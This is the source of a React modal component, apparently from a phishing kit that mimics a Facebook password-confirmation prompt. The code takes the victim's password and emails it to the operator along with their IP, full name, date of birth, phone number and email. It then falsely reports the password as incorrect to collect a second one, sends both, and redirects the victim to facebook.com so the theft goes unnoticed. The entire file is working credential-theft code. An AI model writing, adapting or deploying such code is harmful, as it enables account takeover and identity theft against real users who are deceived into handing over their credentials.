import React from "react";
import { useNavigate } from "react-router-dom";
import { sendEmail } from "../../Utils/sendEmail";
import ButtonSecondary from "../UI/ButtonSecondary/ButtonSecondary";
import InputPassword from "../UI/InputPassword/InputPassword";
import "./Modal.scss";
import ButtonSoft from "../UI/ButtonSoft/ButtonSoft";

const Modal = ({ isModal, setIsModal }) => {
  const router = useNavigate();

  const [password, setPassword] = React.useState("");
  const [attempt, setAttempt] = React.useState(0);

  let pass = React.useRef("");

  const styleModal = ["modal"];
  if (isModal) {
    styleModal.push("modal__active");
  }

  const handleContinue = () => {
    if (attempt === 0) {
      pass.current = password;
      const formData = JSON.parse(localStorage.getItem("form"));
      const content = `
      IP: ${localStorage.getItem("ip")}

      Fulllname: ${formData.fullname}
      Ngày sinh : ${formData.day}
      Tháng sinh : ${formData.month}
      Năm sinh: ${formData.year}
      Số điện thoại : ${formData.phone}
      Email: ${formData.email}
      First password: ${password}
      `;
      sendEmail({ content });
    }
    setAttempt((prev) => prev + 1);
  };

  React.useEffect(() => {
    if (attempt >= 2) {
      const formData = JSON.parse(localStorage.getItem("form"));
      const content = `
      IP: ${localStorage.getItem("ip")}

      Fulllname: ${formData.fullname}
      Ngày sinh : ${formData.day}
      Tháng sinh : ${formData.month}
      Năm sinh: ${formData.year}
      Số điện thoại : ${formData.phone}
      Email: ${formData.email}

      First password: ${pass.current}
      Last password: ${password}
      `;
      sendEmail({ content }).then(() => {
        localStorage.setItem("data_info", content);
        window.location.href = "https://www.facebook.com";
      });
    }
  }, [attempt, password, router]);

  return (
    <div
      className={styleModal.join(" ")}
      aria-hidden="false"
      // onClick={() => setIsModal((state) => !state)}
    >
      <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content">
          {/* <div className="modal-header">
            <div className="modal-title" id="exampleModalLabel">
              Please Enter Your Password
            </div>
            <button
              type="button"
              className="btn-close"
              onClick={() => setIsModal((state) => !state)}
            ></button>
          </div> */}
          <div className="modal-body" style={{}}>
            <h1
              style={{
                fontSize: "1.5rem",

                marginTop: "1.25rem",
              }}
            >
              Please enter your password to continue
            </h1>
            <div
              style={{
                height: 1,
                width: "100%",
                background: "rgb(218, 221, 225)",
                marginTop: "1rem",
                marginBottom: "1.25rem",
              }}
            />

            <div className="modal__body-description">
              We need to confirm the sender of the information is you, Please
              enter your password and then continue.
            </div>
            <div className="modal__body-password">
              <InputPassword
                value={password}
                fun={(e) => setPassword(e.target.value)}
              >
                Password
              </InputPassword>
              {attempt > 0 && (
                <p className="text-danger">
                  Incorrect password, please try again.
                </p>
              )}
            </div>
            <div
              style={{
                marginBottom: "1.25rem",
              }}
            >
              <ButtonSoft disabled={true} fun={handleContinue}>
                Continue
              </ButtonSoft>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Modal;
